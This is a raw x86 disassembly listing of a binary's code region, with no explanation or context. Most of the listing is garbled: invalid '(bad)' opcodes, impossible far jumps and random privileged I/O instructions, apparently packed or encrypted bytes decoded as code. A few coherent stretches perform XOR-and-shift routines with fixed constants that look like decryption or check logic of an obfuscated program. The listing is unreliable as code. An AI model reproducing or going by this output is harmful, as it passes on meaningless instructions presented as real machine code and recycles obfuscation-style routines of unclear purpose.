  409aff:	push   ebp
  409b00:	xchg   ebp,eax
  409b01:	jmp    0x5534:0x2b53704a
  409b08:	jge    0x409afc
  409b0a:	into   
  409b0b:	push   es
  409b0c:	lea    esi,[esi+esi*2-0x3]
  409b10:	jbe    0x409ad7
  409b12:	jns    0x409b76
  409b14:	push   ecx
  409b15:	adc    DWORD PTR [edx+0x37],edx
  409b18:	adc    eax,0xc3f23274
  409b1d:	dec    esi
  409b1e:	push   ebp
  409b1f:	ret    
  409b20:	aaa    
  409b21:	pop    esp
  409b22:	jg     0x409b62
  409b24:	dec    ebx
  409b25:	mov    ebp,0xeb720302
  409b2a:	push   0xffffff9d
  409b2c:	push   eax
  409b2d:	dec    ebp
  409b2e:	arpl   WORD PTR [ebp+0x62],sp
  409b31:	mov    ebp,DWORD PTR [eax]
  409b33:	scas   al,BYTE PTR es:[edi]
  409b34:	pusha  
  409b35:	inc    ecx
  409b36:	test   al,0xb3
  409b38:	sar    BYTE PTR [eax-0x3f7dcf01],0x21
  409b3f:	mov    ecx,0xf9a6f126
  409b44:	cs cli 
  409b46:	jae    0x409adb
  409b48:	jl     0x409b5b
  409b4a:	jmp    0x6a52:0x57e23c0a
  409b51:	or     al,BYTE PTR [ebx+ecx*1]
  409b54:	jne    0x409ba4
  409b56:	mov    eax,gs:0xcfc04e9c
  409b5c:	mov    ?,WORD PTR [ebx]
  409b5e:	mov    edx,0xcbe5e724
  409b63:	lods   al,BYTE PTR ds:[esi]
  409b64:	rcr    DWORD PTR [edx-0x1],1
  409b67:	mov    es,WORD PTR [ecx+0x487284c1]
  409b6d:	leave  
  409b6e:	loop   0x409ba9
  409b70:	sbb    al,0xc9
  409b72:	in     al,0x7e
  409b74:	xchg   edi,eax
  409b75:	push   ebx
  409b76:	scas   eax,DWORD PTR es:[edi]
  409b77:	adc    cl,BYTE PTR [esi]
  409b79:	jo     0x409bde
  409b7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b7c:	mov    ebp,0x7dadd613
  409b81:	adc    eax,edi
  409b83:	or     esi,DWORD PTR [eax-0x7989d4dd]
  409b89:	or     ah,0x10
  409b8c:	cmp    esi,ecx
  409b8e:	(bad)  
  409b8f:	int    0xe2
  409b91:	test   DWORD PTR [edx-0x6a9fc920],eax
  409b97:	repnz popa 
  409b99:	lea    ecx,[eax+0x27ea6dd1]
  409b9f:	mov    WORD PTR [ecx+esi*8-0x5356e50f],fs
  409ba6:	aas    
  409ba7:	arpl   WORD PTR [edx+0x3c],si
  409baa:	xor    edx,edx
  409bac:	or     eax,edx
  409bae:	add    eax,DWORD PTR ds:0x422548
  409bb4:	mov    DWORD PTR [ebp+0x14],eax
  409bb7:	mov    eax,DWORD PTR [ebp-0x60]
  409bba:	mov    ecx,DWORD PTR [ebp-0x5c]
  409bbd:	shrd   eax,ecx,0x2
  409bc1:	shr    ecx,0x2
  409bc4:	mov    ecx,DWORD PTR [ebp-0x60]
  409bc7:	mov    edx,DWORD PTR [ebp-0x5c]
  409bca:	xor    eax,edi
  409bcc:	shl    ecx,0x1e
  409bcf:	xor    edx,edx
  409bd1:	or     eax,edx
  409bd3:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  409bd7:	mov    eax,DWORD PTR [ebp+0x14]
  409bda:	or     BYTE PTR [eax],cl
  409bdc:	mov    eax,DWORD PTR [ebp-0x48]
  409bdf:	mov    ecx,DWORD PTR [ebp-0x44]
  409be2:	shrd   eax,ecx,0x2
  409be6:	shr    ecx,0x2
  409be9:	mov    ecx,DWORD PTR [ebp-0x48]
  409bec:	mov    edx,DWORD PTR [ebp-0x44]
  409bef:	xor    eax,edi
  409bf1:	xor    edx,edx
  409bf3:	or     eax,edx
  409bf5:	add    eax,DWORD PTR ds:0x422548
  409bfb:	shl    ecx,0x1e
  409bfe:	mov    DWORD PTR [ebp+0x14],eax
  409c01:	mov    eax,DWORD PTR [ebp-0x48]
  409c04:	mov    ecx,DWORD PTR [ebp-0x44]
  409c07:	shrd   eax,ecx,0x2
  409c0b:	shr    ecx,0x2
  409c0e:	mov    ecx,DWORD PTR [ebp-0x48]
  409c11:	mov    edx,DWORD PTR [ebp-0x44]
  409c14:	xor    eax,edi
  409c16:	shl    ecx,0x1e
  409c19:	xor    edx,edx
  409c1b:	or     eax,edx
  409c1d:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  409c21:	mov    eax,DWORD PTR [ebp+0x14]
  409c24:	add    BYTE PTR [eax],cl
  409c26:	mov    eax,DWORD PTR [ebp-0x38]
  409c29:	mov    ecx,DWORD PTR [ebp-0x34]
  409c2c:	shrd   eax,ecx,0x2
  409c30:	shr    ecx,0x2
  409c33:	mov    ecx,DWORD PTR [ebp-0x38]
  409c36:	mov    edx,DWORD PTR [ebp-0x34]
  409c39:	xor    edx,edx
  409c3b:	xor    eax,edi
  409c3d:	or     eax,edx
  409c3f:	add    eax,DWORD PTR ds:0x422548
  409c45:	shl    ecx,0x1e
  409c48:	mov    ecx,DWORD PTR [ebp-0x38]
  409c4b:	mov    edx,DWORD PTR [ebp-0x34]
  409c4e:	shrd   ecx,edx,0x2
  409c52:	xor    ecx,edi
  409c54:	shr    edx,0x2
  409c57:	mov    edx,DWORD PTR [ebp-0x38]
  409c5a:	mov    edi,DWORD PTR [ebp-0x34]
  409c5d:	xor    edi,edi
  409c5f:	or     ecx,edi
  409c61:	mov    cl,BYTE PTR [ebp+ecx*1-0x4]
  409c65:	or     BYTE PTR [eax],cl
  409c67:	shl    edx,0x1e
  409c6a:	mov    edx,DWORD PTR [ebx]
  409c6c:	mov    eax,DWORD PTR [ebx+0x4]
  409c6f:	mov    edi,DWORD PTR [ebx]
  409c71:	mov    ecx,DWORD PTR [ebx+0x4]
  409c74:	xor    edx,0xca79a577
  409c7a:	xor    eax,0x9c1b89e8
  409c7f:	shrd   edx,eax,0x2
  409c83:	xor    ecx,ecx
  409c85:	or     ecx,edx
  409c87:	mov    DWORD PTR [ebp+0x8],ecx
  409c8a:	mov    ecx,DWORD PTR [esi]
  409c8c:	mov    edx,DWORD PTR [esi+0x4]
  409c8f:	xor    edx,0x9c1b89e8
  409c95:	xor    ecx,0xca79a577
  409c9b:	mov    DWORD PTR [ebp+0x14],ecx
  409c9e:	mov    ecx,edx
  409ca0:	mov    edx,DWORD PTR [ebp+0x14]
  409ca3:	shrd   edx,ecx,0x2
  409ca7:	shr    eax,0x2
  409caa:	shl    edi,0x1e
  409cad:	mov    DWORD PTR [ebp-0x6c],eax
  409cb0:	mov    DWORD PTR [ebp-0x70],edx
  409cb3:	mov    edx,DWORD PTR [esi]
  409cb5:	mov    eax,0x40000000
  409cba:	xor    edi,eax
  409cbc:	or     edi,DWORD PTR [ebp-0x6c]
  409cbf:	mov    DWORD PTR [ebp+0x14],edx
  409cc2:	shl    DWORD PTR [ebp+0x14],0x1e
  409cc6:	xor    DWORD PTR [ebp+0x14],eax
  409cc9:	mov    DWORD PTR [ebp+0xc],edi
  409ccc:	jmp    0x40a0aa
  409cd1:	jbe    0x409d4e
  409cd3:	fstp   TBYTE PTR [edx+ebx*8-0x78e4c9e4]
  409cda:	ins    DWORD PTR es:[edi],dx
  409cdb:	cmp    DWORD PTR [edi+edx*8-0x45],0xfffffff0
  409ce0:	mov    esi,0x181839cd
  409ce5:	sahf   
  409ce6:	adc    bl,BYTE PTR [eax]
  409ce8:	sbb    cl,cl
  409cea:	aad    0x6d
  409cec:	clc    
  409ced:	xor    eax,0x2cff261f
  409cf2:	or     al,0x2a
  409cf4:	sub    DWORD PTR [esi-0x79],esi
  409cf7:	fisub  WORD PTR ds:0x1c317ccb
  409cfd:	and    al,0x64
  409cff:	pushf  
  409d00:	cdq    
  409d01:	mov    ds:0xb31eee46,al
  409d06:	push   edx
  409d07:	push   ebp
  409d08:	xchg   esi,eax
  409d09:	jge    0x409d12
  409d0b:	sbb    al,0xb1
  409d0d:	sbb    esi,DWORD PTR [edi]
  409d0f:	sbb    DWORD PTR [eax],edi
  409d11:	inc    esi
  409d12:	clc    
  409d13:	cwde   
  409d14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d15:	test   bh,ah
  409d17:	xchg   edi,eax
  409d18:	into   
  409d19:	lock pop edi
  409d1b:	sbb    bl,bl
  409d1d:	aas    
  409d1e:	retf   
  409d1f:	add    BYTE PTR [ebx+ebx*2-0x484cea2a],ch
  409d26:	test   ebx,0xbe8ee396
  409d2c:	push   es
  409d2d:	jne    0x409cbf
  409d2f:	call   0xe4b6f269
  409d34:	mov    edx,eax
  409d36:	jo     0x409d5d
  409d38:	jb     0x409d48
  409d3a:	gs scas al,BYTE PTR es:[edi]
  409d3c:	sub    BYTE PTR [eax],0x86
  409d3f:	mov    dh,0xe0
  409d41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d42:	add    DWORD PTR [ecx+0x4b],edi
  409d45:	mov    cl,0x6
  409d47:	repnz and DWORD PTR [ecx],ebp
  409d4a:	enter  0xdbf9,0x41
  409d4e:	in     al,dx
  409d4f:	add    ecx,DWORD PTR [esi+0x23]
  409d52:	fcom   QWORD PTR [eax+0x6a]
  409d55:	ins    DWORD PTR es:[edi],dx
  409d56:	add    dh,ah
  409d58:	(bad)  
  409d59:	jl     0x409d5b
  409d5b:	cmp    eax,DWORD PTR [edx]
  409d5d:	xchg   esi,eax
  409d5e:	xor    eax,0xf562f173
  409d63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d64:	adc    BYTE PTR ds:0x8798e82a,al
  409d6a:	enter  0xbecd,0xe4
  409d6e:	loop   0x409d0d
  409d70:	das    
  409d71:	jae    0x409d35
  409d73:	pusha  
  409d74:	xor    al,0x42
  409d76:	mov    eax,ds:0xc0791a1e
  409d7b:	push   edi
  409d7c:	pop    edi
  409d7d:	jl     0x409deb
  409d7f:	sbb    DWORD PTR [edi+0x3efb4f17],esi
  409d85:	xor    ch,BYTE PTR [edi+ecx*4+0x3c]
  409d89:	imul   ebp,DWORD PTR [ecx],0x64
  409d8c:	cld    
  409d8d:	sub    BYTE PTR [eax],bh
  409d8f:	add    BYTE PTR [ecx+0x18],bh
  409d92:	jle    0x409dd7
  409d94:	out    0x8a,eax
  409d96:	ss adc al,0xe2
  409d99:	mov    WORD PTR [esi+0x38],?
  409d9c:	add    DWORD PTR [edi-0x4950b30],0xae784113
  409da6:	ss ret 0xe43e
  409daa:	dec    edx
  409dab:	retf   
  409dac:	pusha  
  409dad:	fdiv   QWORD PTR [edi+esi*4]
  409db0:	push   ebp
  409db1:	outs   dx,BYTE PTR ds:[esi]
  409db2:	(bad)
  409db7:	cmp    al,0x7
  409db9:	jecxz  0x409db5
  409dbb:	test   DWORD PTR [ebp-0x44d0ca0f],0x110451d6
  409dc5:	and    eax,0xc622ef7f
  409dca:	repnz mov esp,0xc18aa187
  409dd0:	fidivr WORD PTR [ebp-0x6d09df6f]
  409dd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409dd7:	(bad)  
  409dd8:	loop   0x409d6c
  409dda:	mov    dl,BYTE PTR [eax]
  409ddc:	cmp    al,0xc
  409dde:	and    BYTE PTR [ebp*2+0x5c00b6f7],bh
  409de5:	shl    ebx,cl
  409de7:	sub    BYTE PTR [ebp+0x5714bc07],al
  409ded:	imul   edx,ebx,0x13
  409df0:	sahf   
  409df1:	repz enter 0x80e5,0xb9
  409df6:	imul   ebp,DWORD PTR [edi],0x99665bf4
  409dfc:	mov    al,ah
  409dfe:	pop    esp
  409dff:	xor    al,0x17
  409e01:	in     eax,0xf1
  409e03:	xor    esi,ecx
  409e05:	xchg   ecx,eax
  409e06:	adc    dl,BYTE PTR [esi]
  409e08:	sub    bh,bl
  409e0a:	dec    ecx
  409e0b:	or     esp,DWORD PTR [ebx+0x5367a98a]
  409e11:	or     dh,bh
  409e13:	ss mov dh,0x5
  409e16:	inc    esi
  409e17:	lahf   
  409e18:	add    ah,BYTE PTR [edx]
  409e1a:	jnp    0x409e74
  409e1c:	mov    edx,0x2ec5f639
  409e21:	cli    
  409e22:	jecxz  0x409e6b
  409e24:	xor    al,ah
  409e26:	or     al,0xc9
  409e28:	test   eax,0xc3a38f
  409e2d:	jno    0x409e1d
  409e2f:	mov    DWORD PTR [ebx-0x403e42dd],edi
  409e35:	mov    ebp,0xaa21fa37
  409e3a:	fcmovnu st,st(7)
  409e3c:	clc    
  409e3d:	cmp    cl,BYTE PTR [ebp+0x56844114]
  409e43:	mov    edi,0x83c8c649
  409e48:	pushf  
  409e49:	mov    esp,0x98872d02
  409e4e:	fwait
  409e4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e50:	mov    edi,cs
  409e52:	xchg   esi,eax
  409e53:	sub    al,0x7f
  409e55:	add    esp,DWORD PTR [ebx+0x40]
  409e58:	xor    dl,BYTE PTR [ebx]
  409e5a:	lods   al,BYTE PTR ds:[esi]
  409e5b:	inc    esi
  409e5c:	inc    edx
  409e5d:	(bad)  
  409e5f:	dec    edi
  409e60:	pop    edx
  409e61:	loope  0x409eb9
  409e63:	idiv   BYTE PTR ds:0x95303a48
  409e69:	test   al,0xd4
  409e6b:	repz in eax,dx
  409e6d:	mov    edi,DWORD PTR ds:0xd3251b18
  409e73:	dec    edi
  409e74:	(bad)  
  409e75:	mov    al,0xef
  409e77:	xor    BYTE PTR [ebx-0x2b3c919b],al
  409e7d:	inc    ebp
  409e7e:	paddsw mm4,QWORD PTR [edx+0x22]
  409e82:	mov    ecx,0x4a93628e
  409e87:	add    eax,0xefe695ae
  409e8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e8d:	into   
  409e8e:	jmp    0xe70a282c
  409e93:	outs   dx,BYTE PTR ds:[esi]
  409e94:	repnz int3 
  409e96:	or     eax,esp
  409e98:	xor    esp,edi
  409e9a:	adc    eax,0x80908a10
  409e9f:	out    0x7,al
  409ea1:	mov    bh,0x10
  409ea3:	push   edx
  409ea4:	int    0x5b
  409ea6:	arpl   WORD PTR [esi],cx
  409ea8:	ds pop ds
  409eaa:	dec    edi
  409eab:	mov    ds:0x68f69383,al
  409eb0:	adc    eax,0x2be3040b
  409eb5:	in     al,dx
  409eb6:	dec    ebx
  409eb7:	daa    
  409eb8:	push   0x63
  409eba:	cmp    al,0x73
  409ebc:	shr    DWORD PTR [ecx],1
  409ebe:	jmp    0x409ef5
  409ec0:	or     eax,0x80ba4398
  409ec5:	xchg   edx,eax
  409ec6:	mov    ebp,0x7fde42c9
  409ecb:	dec    esi
  409ecc:	xchg   ebx,eax
  409ecd:	lahf   
  409ece:	test   BYTE PTR [eax+eiz*8+0x657b07db],al
  409ed5:	mov    eax,ds:0x3e124c90
  409eda:	pop    ebp
  409edb:	mov    edi,0xd66cf361
  409ee0:	ins    BYTE PTR es:[edi],dx
  409ee1:	popf   
  409ee2:	jne    0x409ece
  409ee4:	xor    eax,DWORD PTR [ebp-0x15]
  409ee7:	adc    DWORD PTR [esi],0x9c993803
  409eed:	mov    esi,?
  409eef:	test   DWORD PTR [eax],edi
  409ef1:	mov    al,ds:0xf9cc9769
  409ef6:	cmc    
  409ef7:	mov    cl,0xab
  409ef9:	pop    ebp
  409efa:	mov    al,ds:0xd39d602c
  409eff:	or     eax,0x1da6aef0
  409f04:	fistp  WORD PTR [esi-0x18]
  409f07:	add    BYTE PTR [esi],bl
  409f09:	push   es
  409f0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f0b:	push   esi
  409f0c:	mov    dl,0xb0
  409f0e:	out    0x4d,al
  409f10:	cwde   
  409f11:	push   cs
  409f12:	push   0xffffffd2
  409f14:	cwde   
  409f15:	add    ah,dl
  409f17:	fwait
  409f18:	push   ecx
  409f19:	mov    ch,0x65
  409f1b:	xor    BYTE PTR [esi],bl
  409f1d:	jmp    0x71a0:0xc99042b
  409f24:	shl    BYTE PTR [ecx],1
  409f26:	jns    0x409f0b
  409f28:	les    edx,FWORD PTR [esi-0x1ddf93db]
  409f2e:	sbb    BYTE PTR [esi+ebx*1],bl
  409f31:	aas    
  409f32:	or     esi,esi
  409f34:	push   ecx
  409f35:	jnp    0x409ee7
  409f37:	sti    
  409f38:	cmp    DWORD PTR [esi],0x98ff2849
  409f3e:	ja     0x409ec0
  409f40:	bswap  esi
  409f42:	jb     0x409f05
  409f44:	adc    DWORD PTR [edi+0x45],esi
  409f47:	jo     0x409f9b
  409f49:	push   cs
  409f4a:	cwde   
  409f4b:	mov    ebp,0xf991a6e4
  409f50:	pop    DWORD PTR [ebx+0x594ceb7c]
  409f56:	mov    DWORD PTR [esp+edx*8-0x2d],0x7e1f9b02
  409f5e:	jne    0x409fae
  409f60:	mov    BYTE PTR [ebx+0xa963a35],ah
  409f66:	or     al,BYTE PTR [esi-0x39f2fb1d]
  409f6c:	inc    esp
  409f6d:	cld    
  409f6e:	ja     0x409f45
  409f70:	clc    
  409f71:	xchg   ecx,eax
  409f72:	mov    eax,gs
  409f74:	bound  ebp,QWORD PTR [edi+0x59f4caa7]
  409f7a:	mov    ds:0x2eb0376a,eax
  409f7f:	cli    
  409f80:	push   0xfc70a75b
  409f85:	jg     0x409fa2
  409f87:	sbb    DWORD PTR [edx],0xffffff8b
  409f8a:	(bad)  
  409f8b:	mov    esp,0xa00c468e
  409f90:	loope  0x409fc3
  409f92:	ds pusha 
  409f94:	push   0x264194c9
  409f99:	ins    BYTE PTR es:[edi],dx
  409f9a:	xor    al,0x3d
  409f9c:	and    al,BYTE PTR [edi+0x8e7581c]
  409fa2:	cmp    eax,0x3ea14cae
  409fa7:	push   ebp
  409fa8:	add    DWORD PTR [ebp-0x1d],edx
  409fab:	rol    BYTE PTR [esi+0x44ab9816],0x88
  409fb2:	fidivr DWORD PTR [ebx-0x59]
  409fb5:	push   ebp
  409fb6:	pusha  
  409fb7:	sub    eax,DWORD PTR [edx+esi*4+0x40a5f9ba]
  409fbe:	xchg   cl,cl
  409fc0:	adc    al,0xac
  409fc2:	jle    0x409fc2
  409fc4:	push   es
  409fc5:	sbb    ecx,0xa00c4e24
  409fcb:	ficomp DWORD PTR [esi-0x61]
  409fce:	sbb    ebx,DWORD PTR [ebp+0x60a0ec8b]
  409fd4:	jg     0x40a032
  409fd6:	(bad)  
  409fd7:	loop   0x409f7f
  409fd9:	mov    ds:0x48487342,al
  409fde:	and    esp,DWORD PTR [ebx]
  409fe0:	hlt    
  409fe1:	mov    ch,0x7a
  409fe3:	mov    bh,0x83
  409fe5:	je     0x40a02e
  409fe7:	dec    esi
  409fe8:	jae    0x409fcf
  409fea:	jmp    0x78df9334
  409fef:	aam    0xac
  409ff1:	aam    0xee
  409ff3:	xor    DWORD PTR [edx+0x39e931b2],0xffffff90
  409ffa:	loopne 0x40a01f
  409ffc:	cmp    ecx,DWORD PTR [ebp+0x54360b42]
  40a002:	xor    eax,0xa718df7a
  40a007:	pop    edx
  40a008:	dec    ebp
  40a009:	or     BYTE PTR ds:0x66343c18,ah
  40a00f:	xchg   esi,eax
  40a010:	sar    BYTE PTR [edx-0x7a75a6dc],0xae
  40a017:	add    BYTE PTR [ebx],dl
  40a019:	(bad)
  40a01d:	stos   DWORD PTR es:[edi],eax
  40a01e:	xor    eax,DWORD PTR [esi]
  40a020:	inc    ebp
  40a021:	bound  esp,QWORD PTR [ebx]
  40a023:	xor    ah,BYTE PTR [edx]
  40a025:	xor    BYTE PTR [eax],0xc6
  40a028:	pop    ebp
  40a029:	and    al,0xaf
  40a02b:	cld    
  40a02c:	retf   
  40a02d:	(bad)  
  40a030:	cmp    eax,0x72723ce5
  40a035:	gs push edi
  40a037:	dec    edi
  40a038:	mov    bl,0x93
  40a03a:	jns    0x409ff6
  40a03c:	sbb    bh,BYTE PTR [ecx+esi*1-0x52d53cf7]
  40a043:	fwait
  40a044:	(bad)
  40a047:	and    eax,0x40f20a95
  40a04c:	xchg   esi,eax
  40a04d:	popa   
  40a04e:	or     eax,0x65234f4e
  40a053:	or     eax,0x44498823
  40a058:	pusha  
  40a059:	out    dx,al
  40a05a:	nop
  40a05b:	mov    ds:0x96e83041,al
  40a060:	and    bl,BYTE PTR [edi-0x3]
  40a063:	ret    
  40a064:	gs iret 
  40a066:	(bad)  
  40a067:	cdq    
  40a068:	shr    DWORD PTR [ecx+0x7dbf533e],0xf3
  40a06f:	call   0xa7db51cc
  40a074:	cdq    
  40a075:	loope  0x40a08c
  40a077:	(bad)  
  40a078:	in     eax,0x3c
  40a07a:	outs   dx,BYTE PTR ds:[esi]
  40a07b:	rcr    DWORD PTR [ecx-0x41],0xb4
  40a07f:	pop    eax
  40a080:	add    eax,0xb5d4f450
  40a085:	stos   DWORD PTR es:[edi],eax
  40a086:	add    al,0xc9
  40a088:	test   DWORD PTR [edi-0x9],ebp
  40a08b:	ds mov dh,0xef
  40a08e:	mov    ecx,0x1571c6da
  40a093:	add    dh,al
  40a095:	std    
  40a096:	data16 cmp al,0xa1
  40a099:	mov    al,0x32
  40a09b:	xchg   ebp,eax
  40a09c:	into   
  40a09d:	(bad)  
  40a09e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a09f:	xchg   ah,dl
  40a0a1:	sbb    al,0x32
  40a0a3:	xchg   esp,eax
  40a0a4:	xchg   ebx,eax
  40a0a5:	retf   0x86cd
  40a0a8:	cli    
  40a0a9:	aas    
  40a0aa:	mov    edi,DWORD PTR [esi+0x4]
  40a0ad:	mov    edi,DWORD PTR [ebp+0x14]
  40a0b0:	xor    edx,edx
  40a0b2:	or     edx,DWORD PTR [ebp-0x70]
  40a0b5:	shr    ecx,0x2
  40a0b8:	or     edi,ecx
  40a0ba:	cmp    edx,DWORD PTR [ebp+0x8]
  40a0bd:	jne    0x40a9b0
  40a0c3:	cmp    edi,DWORD PTR [ebp+0xc]
  40a0c6:	jne    0x40a9b0
  40a0cc:	jmp    0x40a926
  40a0d1:	mov    eax,DWORD PTR [esi]
  40a0d3:	mov    edx,DWORD PTR [esi+0x4]
  40a0d6:	mov    eax,DWORD PTR [esi]
  40a0d8:	mov    edx,DWORD PTR [esi+0x4]
  40a0db:	xor    eax,0xca79a577
  40a0e0:	xor    edx,ecx
  40a0e2:	mov    ecx,eax
  40a0e4:	mov    eax,edx
  40a0e6:	shrd   ecx,eax,0x2
  40a0ea:	shr    eax,0x2
  40a0ed:	mov    DWORD PTR [ebp+0xc],eax
  40a0f0:	mov    eax,DWORD PTR [esi]
  40a0f2:	mov    edx,DWORD PTR [esi+0x4]
  40a0f5:	mov    edx,eax
  40a0f7:	xor    eax,eax
  40a0f9:	or     eax,ecx
  40a0fb:	mov    ecx,DWORD PTR [ebx]
  40a0fd:	shl    edx,0x1e
  40a100:	xor    edx,0x40000000
  40a106:	mov    DWORD PTR [ebp+0x10],eax
  40a109:	mov    eax,edx
  40a10b:	or     eax,DWORD PTR [ebp+0xc]
  40a10e:	mov    edx,DWORD PTR [ebx+0x4]
  40a111:	push   eax
  40a112:	push   DWORD PTR [ebp+0x10]
  40a115:	push   edx
  40a116:	push   ecx
  40a117:	jmp    0x40a4f5
  40a11c:	std    
  40a11d:	dec    ecx
  40a11e:	mov    ah,0xd2
  40a120:	sub    al,0x22
  40a122:	fidivr DWORD PTR [edi]
  40a124:	test   al,0x29
  40a126:	push   ebp
  40a127:	stos   BYTE PTR es:[edi],al
  40a128:	sub    dl,BYTE PTR [eax+0x33527cc3]
  40a12e:	sbb    BYTE PTR [eax],bl
  40a130:	sahf   
  40a131:	adc    bl,BYTE PTR [eax]
  40a133:	sbb    BYTE PTR [edi],dh
  40a135:	inc    esi
  40a137:	loopne 0x40a0cd
  40a139:	mov    dh,0xfc
  40a13b:	ret    0x423
  40a13e:	repnz out 0xf5,eax
  40a141:	outs   dx,DWORD PTR ds:[esi]
  40a142:	xchg   BYTE PTR [esp+esi*4+0x55967ce4],ch
  40a149:	cmp    al,0x65
  40a14b:	push   eax
  40a14c:	adc    eax,0x5952d5f4
  40a151:	loop   0x40a186
  40a153:	inc    esi
  40a154:	call   0x8e08:0xb5f461c5
  40a15b:	in     al,dx
  40a15c:	fmulp  st(2),st
  40a15e:	mov    ebp,0x6f4dfe0c
  40a163:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a164:	inc    esi
  40a165:	sbb    DWORD PTR [ecx+0x3a158ad8],0xffffffd3
  40a16c:	or     dh,BYTE PTR [ecx+edi*8-0x4b]
  40a170:	jmp    0x32de:0x140b4fda
  40a177:	cs pop es
  40a179:	xor    al,0xdd
  40a17b:	dec    edi
  40a17c:	scas   eax,DWORD PTR es:[edi]
  40a17d:	clc    
  40a17e:	test   al,cl
  40a180:	shl    cl,cl
  40a182:	cli    
  40a183:	adc    DWORD PTR [ecx+eiz*1],0xe4aace6d
  40a18a:	in     eax,dx
  40a18b:	stc    
  40a18c:	and    eax,0xb83b0484
  40a191:	in     al,0x1e
  40a193:	(bad)  
  40a196:	jg     0x40a1a0
  40a198:	push   0x3
  40a19a:	popa   
  40a19b:	add    esp,esp
  40a19d:	mov    esp,0xc26747a8
  40a1a2:	loopne 0x40a1a0
  40a1a4:	jne    0x40a1d2
  40a1a6:	js     0x40a177
  40a1a8:	icebp  
  40a1a9:	les    ecx,FWORD PTR [ebx]
  40a1ab:	xchg   edx,eax
  40a1ac:	jl     0x40a189
  40a1ae:	outs   dx,DWORD PTR ds:[esi]
  40a1af:	jg     0x40a1c2
  40a1b1:	or     edx,DWORD PTR [ecx]
  40a1b3:	jg     0x40a16b
  40a1b5:	(bad)  
  40a1b6:	mov    dh,0x5a
  40a1b8:	inc    eax
  40a1b9:	imul   ebp,DWORD PTR [ecx-0x8],0xffffff83
  40a1bd:	push   ecx
  40a1be:	xor    eax,0x959ecbb9
  40a1c3:	and    bl,ch
  40a1c5:	mov    dh,0x5e
  40a1c7:	xchg   bh,al
  40a1c9:	inc    ebp
  40a1ca:	pusha  
  40a1cb:	pop    esi
  40a1cc:	sub    ebx,DWORD PTR [esi+0x594af391]
  40a1d2:	aam    0x5a
  40a1d4:	push   ebp
  40a1d5:	sar    DWORD PTR [ecx],cl
  40a1d7:	jp     0x40a210
  40a1d9:	xor    DWORD PTR [edi],eax
  40a1db:	pop    edi
  40a1dc:	ror    DWORD PTR [ebp+0x58],0x92
  40a1e0:	jae    0x40a1e3
  40a1e2:	push   es
  40a1e3:	sub    bh,ah
  40a1e5:	sahf   
  40a1e6:	test   eax,0x14bf9995
  40a1eb:	repnz push 0xffffff9f
  40a1ee:	xchg   edx,eax
  40a1ef:	sub    eax,DWORD PTR [eax+0x1df33b76]
  40a1f5:	sbb    esi,DWORD PTR [eax]
  40a1f7:	pop    esp
  40a1f8:	cmp    al,0x48
  40a1fa:	adc    BYTE PTR [edx-0xf],cl
  40a1fd:	aad    0x61
  40a1ff:	ja     0x40a242
  40a201:	popa   
  40a202:	cdq    
  40a203:	popa   
  40a204:	or     al,0x62
  40a206:	push   ss
  40a207:	das    
  40a208:	mov    dh,0xec
  40a20a:	(bad)  
  40a20b:	fiadd  WORD PTR [eax-0xa]
  40a20e:	(bad)  
  40a20f:	mov    eax,0xab0cc102
  40a214:	add    BYTE PTR [ecx+0x3a03ef20],bh
  40a21a:	and    ebx,DWORD PTR [eax]
  40a21c:	cmp    al,bh
  40a21e:	(bad)  
  40a21f:	mov    dl,0x68
  40a221:	and    al,0xdc
  40a223:	inc    esp
  40a224:	mov    cl,0x19
  40a226:	rcl    BYTE PTR [ebx+0xcd5675f],1
  40a22c:	dec    edx
  40a22d:	mov    esp,0x862ac56b
  40a232:	jge    0x40a1cd
  40a234:	inc    edx
  40a235:	mov    ecx,0xe30e7eb7
  40a23a:	ss pushf 
  40a23c:	or     eax,0x8d7b4833
  40a241:	pop    eax
  40a242:	jge    0x40a296
  40a244:	loope  0x40a236
  40a246:	cld    
  40a247:	add    edx,DWORD PTR [esi]
  40a249:	sub    al,0xc9
  40a24b:	xor    esp,DWORD PTR [ebp+0x19]
  40a24e:	mov    ch,0x46
  40a250:	fsubr  st,st(0)
  40a253:	enter  0xad20,0xfa
  40a257:	jbe    0x40a251
  40a259:	rcl    BYTE PTR [ebx-0x21],cl
  40a25c:	bound  edi,QWORD PTR [esi+0x73f232e0]
  40a262:	mov    eax,0x7531a2fb
  40a267:	sub    ebp,DWORD PTR [edx]
  40a269:	pop    ss
  40a26a:	push   ebx
  40a26b:	jle    0x40a2d2
  40a26d:	lahf   
  40a26e:	(bad)
  40a273:	sbb    DWORD PTR [esi],eax
  40a275:	fdivr  DWORD PTR [esi-0x7b]
  40a278:	push   eax
  40a279:	mov    dl,0xc7
  40a27b:	adc    bl,bh
  40a27d:	pop    esi
  40a27e:	pop    ebx
  40a27f:	retf   
  40a280:	sahf   
  40a281:	pop    edx
  40a282:	adc    al,0x74
  40a284:	lods   eax,DWORD PTR ds:[esi]
  40a285:	adc    al,0xb6
  40a287:	imul   ebx,DWORD PTR [edx+0x707e406a],0xffffffe6
  40a28e:	pushf  
  40a28f:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  40a291:	ins    DWORD PTR es:[edi],dx
  40a292:	aaa    
  40a293:	mov    ?,WORD PTR [ebx+0x1eef1eb2]
  40a299:	pop    ecx
  40a29a:	push   ebp
  40a29b:	mov    ebx,DWORD PTR [eax+0x402c8a2f]
  40a2a1:	jne    0x40a2e2
  40a2a3:	hlt    
  40a2a4:	sub    BYTE PTR [eax+edx*8],bl
  40a2a7:	(bad)  
  40a2a8:	pop    ebp
  40a2a9:	and    al,0x3d
  40a2ab:	mov    al,0x1a
  40a2ad:	scas   eax,DWORD PTR es:[edi]
  40a2ae:	scas   al,BYTE PTR es:[edi]
  40a2af:	jmp    0xa9a63e60
  40a2b4:	sbb    al,0x10
